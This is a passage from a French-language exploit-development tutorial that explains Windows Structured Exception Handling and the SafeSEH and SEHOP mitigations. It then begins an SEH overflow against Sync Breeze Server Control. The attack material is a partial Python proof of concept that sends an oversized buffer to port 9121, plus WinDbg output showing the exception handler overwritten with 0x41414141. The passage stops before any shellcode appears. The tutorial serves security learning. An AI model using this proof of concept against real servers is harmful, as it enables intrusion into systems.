<li>e.g. :  Un développeur veut lever une exception dans le code pour signaler qu'une fonction ne s'est pas exécutée correctement via un bloc <code>try {} except {}</code></li>
</ul>
</li>
</ul>
<p>La plupart des langages implémentent des fonctionnalités de <code>try</code> et <code>catch</code> bien que les mots clés puissent varier.</p>
<p>À la suite de la compilation, <code>try {} except {}</code> va utiliser le mécanisme <code>Structure Exception Handling (SEH)</code> implémenté par Windows pour gérer les événements inattendus.</p>
<h3 id="le-mecanisme-seh">Le mécanisme SEH</h3>
<p>Le mécanisme <code>SEH</code> donne la possibilité aux développeurs de prendre action quand un événement inattendu se réalise durant le flot d'exécution d'un <em>thread</em>.</p>
<p>Quand un thread est en défaut le système d'exploitation appelle un ensemble de fonctions prédéfinies nommées <em>exception handlers</em>.</p>
<p>Ces fonctions vont fournir des données et tenter de corriger l'exception. Les <em>exception handlers</em> sont créées durant la compilation.</p>
<p>À chaque fois qu'un bloc <code>try</code> est rencontré durant l'exécution d'une fonction dans un <em>thread</em>, un pointeur vers le <em>handler</em> correspondant est stocké sur la pile dans la structure <code>_EXCEPTION_REGISTRATION_RECORD</code>.</p>
<p>Comme il peut y avoir plusieurs blocs <code>try</code> exécutés dans une fonction ces structures sont liées par une liste chainée.</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/s-lck/HolisticPwning/main/assets/seh_overflow_01.png">
</p>

<p>Quand une exception est levée, le système d'exploitation inspecte la structure <code>Thread Environmental Block</code> (<code>TEB</code>) du thread impliqué et retrouve le pointeur (<code>ExceptionList</code>) vers la liste chainée <code>_EXCEPTION_REGISTRATION_RECORD</code> via le registre <code>FS</code> du CPU.</p>
<p>Après avoir retrouvé le <code>ExceptionList</code> l'OS va appeler chaque <em>exception handler</em> jusqu'à ce qu'une d'entre elles puisse gérer l'événement.</p>
<p>Si aucune des fonctions définies par l'utilisateur ne peut gérer l'exception, le système d'exploitation va appeler le <em>default exception handler</em> qui est le dernier noeud de la liste chainée.</p>
<h4 id="structures">Structures</h4>
<h5 id="thread-environmental-block">Thread Environmental Block</h5>
<p>Structure <code>TEB</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="mi">0</span><span class="o">:</span><span class="mo">010</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dt</span><span class="w"> </span><span class="n">nt</span><span class="o">!</span><span class="n">_TEB</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">ntdll</span><span class="o">!</span><span class="n">_TEB</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x000</span><span class="w"> </span><span class="n">NtTib</span><span class="w">            </span><span class="o">:</span><span class="w"> </span><span class="n">_NT_TIB</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x01c</span><span class="w"> </span><span class="n">EnvironmentPointer</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x020</span><span class="w"> </span><span class="n">ClientId</span><span class="w">         </span><span class="o">:</span><span class="w"> </span><span class="n">_CLIENT_ID</span>
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x028</span><span class="w"> </span><span class="n">ActiveRpcHandle</span><span class="w">  </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x02c</span><span class="w"> </span><span class="n">ThreadLocalStoragePointer</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x030</span><span class="w"> </span><span class="n">ProcessEnvironmentBlock</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">_PEB</span>
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x034</span><span class="w"> </span><span class="n">LastErrorValue</span><span class="w">   </span><span class="o">:</span><span class="w"> </span><span class="n">Uint4B</span>
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x038</span><span class="w"> </span><span class="n">CountOfOwnedCriticalSections</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">Uint4B</span>
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x03c</span><span class="w"> </span><span class="n">CsrClientThread</span><span class="w">  </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x040</span><span class="w"> </span><span class="n">Win32ThreadInfo</span><span class="w">  </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
</code></pre></div>
<p>On voit que le premier élément de la structure <code>TEB</code> est lui-même une structure de type <code>_NT_TIB</code>.</p>
<h5 id="_nt_tib">_NT_TIB</h5>
<p>Structure <code>_NT_TIB</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="mi">0</span><span class="o">:</span><span class="mo">010</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dt</span><span class="w"> </span><span class="n">_NT_TIB</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">ntdll</span><span class="o">!</span><span class="n">_NT_TIB</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x000</span><span class="w"> </span><span class="n">ExceptionList</span><span class="w">    </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x004</span><span class="w"> </span><span class="n">StackBase</span><span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x008</span><span class="w"> </span><span class="n">StackLimit</span><span class="w">       </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x00c</span><span class="w"> </span><span class="n">SubSystemTib</span><span class="w">     </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x010</span><span class="w"> </span><span class="n">FiberData</span><span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x010</span><span class="w"> </span><span class="n">Version</span><span class="w">          </span><span class="o">:</span><span class="w"> </span><span class="n">Uint4B</span>
<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x014</span><span class="w"> </span><span class="n">ArbitraryUserPointer</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">Void</span>
<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x018</span><span class="w"> </span><span class="n">Self</span><span class="w">             </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">_NT_TIB</span>
</code></pre></div>
<p>Le premier élément de la structure nommé <code>ExceptionList</code> est un pointeur sur la structure <code>_EXCEPTION_REGISTRATION_RECORD</code> :</p>
<h5 id="_exception_registration_record">_EXCEPTION_REGISTRATION_RECORD</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="mi">0</span><span class="o">:</span><span class="mo">010</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dt</span><span class="w"> </span><span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">ntdll</span><span class="o">!</span><span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x000</span><span class="w"> </span><span class="n">Next</span><span class="w">             </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w"> </span><span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">   </span><span class="o">+</span><span class="mh">0x004</span><span class="w"> </span><span class="n">Handler</span><span class="w">          </span><span class="o">:</span><span class="w"> </span><span class="n">Ptr32</span><span class="w">     </span><span class="n">_EXCEPTION_DISPOSITION</span>
</code></pre></div>
<ul>
<li><code>Next</code> fais le lien pour la liste chainée et est un pointeur sur la structure <code>_EXCEPTION_REGISTRATION_RECORD</code></li>
<li><code>Handler</code> est un pointeur vers la fonction <em>exception callback</em> nommé <code>_except_hamdler</code> qui renvoie une structure <code>_EXCEPTION_DISPOSITION</code></li>
</ul>
<h5 id="_exception_disposition">_EXCEPTION_DISPOSITION</h5>
<p>Structure <code>_EXCEPTION_DISPOSITION</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">typedef</span><span class="w"> </span><span class="n">EXCEPTION_DISPOSITION</span><span class="w"> </span><span class="n">_except_handler</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">PEXCEPTION_ROUTINE</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w">  </span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">PEXCEPTION_RECORD</span><span class="w"> </span><span class="n">ExceptionRecord</span><span class="p">,</span><span class="w">  </span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="c1">// pointe sur la structure _EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">VOID</span><span class="w"> </span><span class="n">EstablisherFrame</span><span class="p">,</span><span class="w">  </span>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="c1">// pointe sur la structure `CONTEXT`</span>
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">OUT</span><span class="w"> </span><span class="n">PCONTEXT</span><span class="w"> </span><span class="n">ContextRecord</span><span class="p">,</span><span class="w">  </span>
<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">OUT</span><span class="w"> </span><span class="n">PDISPATCHER_CONTEXT</span><span class="w"> </span><span class="n">DispatcherContext</span><span class="w">  </span>
<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="p">);</span>
</code></pre></div>
<p>La structure <code>CONTEXT</code> contiens les données de certains registres du CPU lorsque l'exception est levée, dont le pointeur <code>EIP</code>.</p>
<p>Les informations de cette structure vont être utilisées pour restaurer le flot d'exécution après la gestion de l'exception.</p>
<ul>
<li>Si le <em>exception handler</em> invoqué par l'OS n'est pas valide pour gérer l'exception il va renvoyer <code>ExceptionContinueSearch</code><ul>
<li>Indique à l'OS de se déplacer à l'élément suivant de la liste chainée <code>_EXCEPTION_REGISTRATION_RECORD</code></li>
</ul>
</li>
<li>Si le <em>exception handler</em> est à même de <em>handle</em> l'exception il va renvoyer <code>ExceptionContinueExecution</code><ul>
<li>Indique à l'OS de relancer l'exécution</li>
</ul>
</li>
</ul>
<h4 id="etapes-du-seh">Étapes du SEH</h4>
<p>Quand une exception est levée, le système d'exploitation appelle un groupe de fonction définie dans le cadre du mécanisme <code>SEH</code>.</p>
<p>Au sein de ces appels, la liste chainée <code>ExceptionList</code> est récupérée du <code>TEB</code>. Le système d'exploitation parse la liste chainée de structures <code>_EXCEPTION_REGISTRATION_RECORD</code>. Le système d'exploitation réalise plusieurs contrôles avant d'appeler la fonction <code>exception_handler</code> pointée par le membre <code>Handler</code> de la structure.</p>
<p>L'itération de la liste chainée continue jusqu'à ce qu'un <em>handler</em> capable de gérer l'exception soit trouvé permettant à l'exécution de continuer. Si aucun <em>handler</em> capable n'est trouvé, l'application crash.</p>
<h4 id="protections-de-seh">Protections de SEH</h4>
<ul>
<li><code>SafeSEH</code> : Mitigation introduite par Microsoft pour empêcher un attaquant de gagner le contrôle du flot d'exécution après avoir réécrit un <em>exception handler</em> sur la pile</li>
<li><code>SEHOP</code> : Vérifie que la chaine de structure <code>_EXCEPTION_REGISTRATION_RECORD</code> est valide avant de l'invoquer. Si le paramètre <code>Next</code> est réécrit, la structure n'est plus intact. Cette mitigation empêchera le <code>_except_handler</code> d'être exécuté.</li>
</ul>
<h2 id="pratique">Pratique</h2>
<p>Une <em>structure exception overflow</em> est un type de <em>stack overflow</em> qui est assez large ou bien positionné de façon à réécrire des <em>valid registered exception handler</em> sur la pile. En réécrivant un ou plusieurs de ces handlers l'attaquant peut prendre le contrôle du pointeur d'instruction après avoir <em>trigger</em> une exception.</p>
<p>Dans la plupart des cas, l'objectif d'un overflow est de réécrire des pointeurs valides / structures sur la pile.</p>
<p>Pousser l'application à crash déclenche dans tous les cas le mécanisme <code>SEH</code> et entraine une redirection du pointeur d'instruction vers l'adresse du <em>exception_handler</em> avant d'atteindre la fin de la fonction.</p>
<p>L'exemple utilisé sera l'exploit portant sur l'application <a href="https://www.exploit-db.com/exploits/44481">Sync Breeze Server Control</a>.</p>
<h3 id="valider-lexploit">Valider l'exploit</h3>
<p>La première étape est d'identifier la présence du dépassement de tampon.</p>
<p>Dans ce cas, c'est l'entête de la requête qui est vulnérable.</p>
<p>Début de la preuve de concept en Python :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">9121</span>
<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">size</span>
<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>  <span class="n">header</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\x19\xba\xab</span><span class="s2">&quot;</span>
<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x03\x00\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x40\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>
<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">inputBuffer</span> 
<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div>
<p>Si on s'attache au service avec WinDbg et qu'on exécute cette preuve de concept, on obtient le résultat suivant :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">(</span><span class="n">144</span><span class="p">.</span><span class="n">6dc</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libpal</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="n">eax</span><span class="p">=</span><span class="n">41414141</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c6fa1c</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c6ff18</span> <span class="n">edx</span><span class="p">=</span><span class="n">01c6f9d4</span> <span class="n">esi</span><span class="p">=</span><span class="n">01c6ff18</span> <span class="n">edi</span><span class="p">=</span><span class="n">01c6fb20</span>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="n">eip</span><span class="p">=</span><span class="n">00902a9d</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c6f9a8</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c6fec8</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010206</span>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="n">libpal</span><span class="p">!</span><span class="n">SCA_ConfigObj</span><span class="p">::</span><span class="n">Deserialize</span><span class="p">+</span><span class="n">0x1d</span><span class="p">:</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="n">00902a9d</span> <span class="n">ff5024</span>          <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="p">+</span><span class="n">24h</span><span class="p">]</span>  <span class="n">ds</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">41414165</span><span class="p">=????????</span>
</code></pre></div>
<p>On affiche la structure du <code>TEB</code> pour récupérer l'adresse de <code>ExceptionList</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">teb</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">TEB</span> <span class="n">at</span> <span class="n">00209000</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="n">ExceptionList</span><span class="p">:</span>        <span class="n">01c6fe1c</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="n">StackBase</span><span class="p">:</span>            <span class="n">01c70000</span>
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    <span class="n">StackLimit</span><span class="p">:</span>           <span class="n">01c6f000</span>
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="p">[...]</span>
</code></pre></div>
<p>On affiche l'élément <code>ExceptionList</code> de type <code>_EXCEPTION_REGISTRATION_RECORD</code> qui est donc le premier élément de la liste chainée :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">dt</span> <span class="n">_EXCEPTION_REGISTRATION_RECORD</span> <span class="n">01c6fe1c</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>   <span class="p">+</span><span class="n">0x000</span> <span class="n">Next</span>             <span class="p">:</span> <span class="n">0x01c6ff54</span> <span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>   <span class="p">+</span><span class="n">0x004</span> <span class="n">Handler</span>          <span class="p">:</span> <span class="n">0x0097df5b</span>     <span class="n">_EXCEPTION_DISPOSITION</span>  <span class="n">libpal</span><span class="p">!</span><span class="n">md5_starts</span><span class="p">+</span><span class="n">0</span>
</code></pre></div>
<p>On utilise l'élément <code>Next</code> de la structure, élément qui pointe vers une autre structure de type <code>_EXCEPTION_REGISTRATION_RECORD</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">dt</span> <span class="n">_EXCEPTION_REGISTRATION_RECORD</span> <span class="n">0x01c6ff54</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>   <span class="p">+</span><span class="n">0x000</span> <span class="n">Next</span>             <span class="p">:</span> <span class="n">0x41414141</span> <span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>   <span class="p">+</span><span class="n">0x004</span> <span class="n">Handler</span>          <span class="p">:</span> <span class="n">0x41414141</span>     <span class="n">_EXCEPTION_DISPOSITION</span>  <span class="p">+</span><span class="n">41414141</span>
</code></pre></div>
<p>C'est donc le deuxième élément de la liste chainée qui est concernée par le dépassement de tampon.</p>
<p>Ce processus peut-être automatisé par la commande <code>exchain</code> de WinDBG :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">exchain</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">01c6fe1c</span><span class="p">:</span> <span class="n">libpal</span><span class="p">!</span><span class="n">md5_starts</span><span class="p">+</span><span class="n">149fb</span> <span class="p">(</span><span class="n">0097df5b</span><span class="p">)</span>
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">01c6ff54</span><span class="p">:</span> <span class="n">41414141</span>
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">Invalid</span> <span class="n">exception</span> <span class="n">stack</span> <span class="n">at</span> <span class="n">41414141</span>
</code></pre></div>
<p>On note que l'adresse <code>01c6ff54</code> qui contient <code>41414141</code> est bien la même que celle du deuxième élément de la liste chainée.</p>
<p>Le <em>_except_handler</em> du deuxième élément de la liste chainée a donc été réécrit par le dépassement. Ainsi dès lors que la structure <code>_EXCEPTION_REGISTRATION_RECORD</code> sera utilisée pour prendre en charge l'exception le CPU va finir par appeler <code>0x41414141</code> ce qui va nous donner le contrôle du registre <code>EIP</code>.</p>
<p>Si on affiche les registres, on voit que <code>EIP</code> n'est pas encore sous notre contrôle :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="nb">r</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">41414141</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c6fa1c</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c6ff18</span> <span class="n">edx</span><span class="p">=</span><span class="n">01c6f9d4</span> <span class="n">esi</span><span class="p">=</span><span class="n">01c6ff18</span> <span class="n">edi</span><span class="p">=</span><span class="n">01c6fb20</span>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">00902a9d</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c6f9a8</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c6fec8</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
